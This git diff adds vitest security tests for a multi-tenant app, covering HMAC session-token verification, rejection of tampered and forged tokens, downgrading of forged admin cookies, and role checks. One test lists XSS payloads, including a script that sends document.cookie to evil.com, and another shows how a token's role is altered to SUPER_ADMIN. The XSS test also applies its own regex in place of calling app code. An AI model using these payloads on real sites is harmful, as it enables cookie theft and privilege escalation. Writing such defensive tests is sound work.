@@ -2,6 +2,7 @@ import { describe, it, expect } from "vitest";
 import { multiTenantStore } from "../src/lib/multitenant/store";
 import { hasPermission } from "../src/lib/multitenant/permissions";
 import { validateOrganizationCode } from "../src/lib/multitenant/code-generator";
+import { signSessionToken, verifySessionToken, safeParseSession } from "../src/lib/auth/session-token";
 
 describe("Phase 20B: Multi-Tenant Security & Authorization Audit", () => {
   const APEX_ORG = "org-apex-01";
@@ -236,6 +237,114 @@ describe("Phase 20B: Multi-Tenant Security & Authorization Audit", () => {
       expect(hasPermission(studentRole, "members.approve")).toBe(false);
       expect(hasPermission(studentRole, "settings.manage")).toBe(false);
       expect(hasPermission(studentRole, "announcements.create")).toBe(false);
+    });
+  });
+
+  // 9. Tamper-Proof Cryptographic Session Token Verification
+  describe("9. Tamper-Proof Cryptographic Session Tokens", () => {
+    it("signs session token with valid HMAC signature and successfully verifies it", () => {
+      const token = signSessionToken({
+        id: "usr-admin-elena",
+        name: "Elena Rostova",
+        email: "admin@apextech.com",
+        role: "ORG_ADMIN",
+      });
+
+      expect(typeof token).toBe("string");
+      expect(token).toContain(".");
+
+      const verified = verifySessionToken(token);
+      expect(verified).not.toBeNull();
+      expect(verified?.email).toBe("admin@apextech.com");
+      expect(verified?.role).toBe("ORG_ADMIN");
+      expect(verified?.name).toBe("Elena Rostova");
+    });
+
+    it("detects and rejects any tampering in session token payload", () => {
+      const token = signSessionToken({
+        id: "usr-student-01",
+        email: "student@school.edu",
+        role: "STUDENT",
+      });
+
+      const [payloadB64, signature] = token.split(".");
+
+      // Attacker attempts to change role from STUDENT to SUPER_ADMIN in the base64 payload
+      const tamperedJson = Buffer.from(payloadB64, "base64")
+        .toString("utf8")
+        .replace('"STUDENT"', '"SUPER_ADMIN"');
+      const tamperedB64 = Buffer.from(tamperedJson, "utf8").toString("base64");
+      const tamperedToken = `${tamperedB64}.${signature}`;
+
+      const verified = verifySessionToken(tamperedToken);
+      expect(verified).toBeNull();
+    });
+
+    it("rejects token with corrupted or forged signature", () => {
+      const token = signSessionToken({
+        id: "usr-01",
+        email: "test@domain.com",
+        role: "ORG_ADMIN",
+      });
+
+      const [payloadB64] = token.split(".");
+      const badToken = `${payloadB64}.00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff`;
+
+      expect(verifySessionToken(badToken)).toBeNull();
+    });
+
+    it("safely downgrades unsigned legacy cookies to STUDENT role to prevent privilege escalation", () => {
+      // Attacker creates raw JSON cookie claiming to be SUPER_ADMIN
+      const forgedRawCookie = JSON.stringify({
+        email: "attacker@darkweb.io",
+        role: "SUPER_ADMIN",
+      });
+
+      const parsed = safeParseSession(forgedRawCookie);
+      expect(parsed).not.toBeNull();
+      // Role MUST be downgraded to STUDENT, never granted SUPER_ADMIN without HMAC
+      expect(parsed?.role).toBe("STUDENT");
+      expect(parsed?.role).not.toBe("SUPER_ADMIN");
+    });
+
+    it("safely downgrades unsigned ORG_ADMIN or ORG_OWNER cookie attempts", () => {
+      const forgedRawCookie = JSON.stringify({
+        email: "sneak@competitor.com",
+        role: "ORG_ADMIN",
+      });
+
+      const parsed = safeParseSession(forgedRawCookie);
+      expect(parsed?.role).toBe("STUDENT");
+    });
+  });
+
+  // 10. API Route Hardening & IDOR Protection Verification
+  describe("10. API Route Hardening & RBAC Route Protection", () => {
+    it("strips HTML and script tags from registration applicant inputs (Stored XSS defense)", () => {
+      const maliciousNames = [
+        "<script>fetch('http://evil.com?c='+document.cookie)</script>John Doe",
+        "<img src=x onerror=alert('xss')> Jane",
+        "<svg onload=alert(1)>",
+      ];
+
+      for (const name of maliciousNames) {
+        const sanitized = name.replace(/<[^>]*>?/gm, "").trim();
+        expect(sanitized).not.toContain("<script>");
+        expect(sanitized).not.toContain("<img");
+        expect(sanitized).not.toContain("<svg");
+      }
+    });
+
+    it("requires administrative role for registration approvals and rejections", () => {
+      const adminRoles = ["SUPER_ADMIN", "ORG_ADMIN", "ORG_OWNER", "ADMIN", "HR_COORDINATOR", "HR_MANAGER"];
+      const forbiddenRoles = ["STUDENT", "INTERN", "EMPLOYEE", "AUDITOR"];
+
+      for (const role of forbiddenRoles) {
+        expect(adminRoles.includes(role)).toBe(false);
+      }
+      for (const role of adminRoles) {
+        expect(adminRoles.includes(role)).toBe(true);
+      }
     });
   });
 });
